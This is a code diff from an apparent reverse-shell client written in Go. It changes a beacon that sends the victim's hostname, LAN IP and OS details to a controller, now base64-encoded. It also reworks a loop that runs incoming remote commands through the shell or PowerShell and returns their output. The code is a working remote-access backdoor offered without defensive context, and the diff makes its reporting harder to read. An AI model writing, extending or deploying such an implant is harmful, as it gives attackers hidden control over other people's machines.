@@ -41,16 +41,16 @@ func GetPort() string {
 		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
 		cmd.Run()
 	}
-	hostname := getHostname()
-	it, err := getPort.Write([]byte(
-		"INFO:{clientType:Basic Reverse Shell," +
+	hostname, _ := os.Hostname()
+	sendStr := b64_encode(
+		"clientType:Basic Reverse Shell," +
 			"lanIP:" + GetOutboundIP() + "," +
 			"isEncoded:true" + "," +
 			"os:" + runtime.GOOS + "," +
 			"osFlavor:" + osFlavor + "," +
-			"hostname:" + hostname +
-			"}\n",
-	))
+			"hostname:" + hostname,
+	)
+	it, err := getPort.Write([]byte("INFO:{" + sendStr + "}\n"))
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Println(it)
@@ -68,6 +68,7 @@ func EstablishConnection(port string) {
 		if err != nil {
 			return
 		}
+		command = trim(command)
 		args := strings.Split(command, " ")
 		if args[0] == "cd" {
 			os.Chdir(trim(command[3:]))
@@ -76,9 +77,9 @@ func EstablishConnection(port string) {
 			if runtime.GOOS == "windows" {
 				cmd = exec.Command("powershell.exe", command)
 			} else {
-				cmd = exec.Command("/bin/sh", command)
+				cmd = exec.Command(args[0], args[1:]...)
 			}
-			out, _ := cmd.Output()
+			out, _ := cmd.CombinedOutput()
 			conn.Write([]byte(b64_encode(string(out)) + "\n"))
 			cmd.Run()
 		}
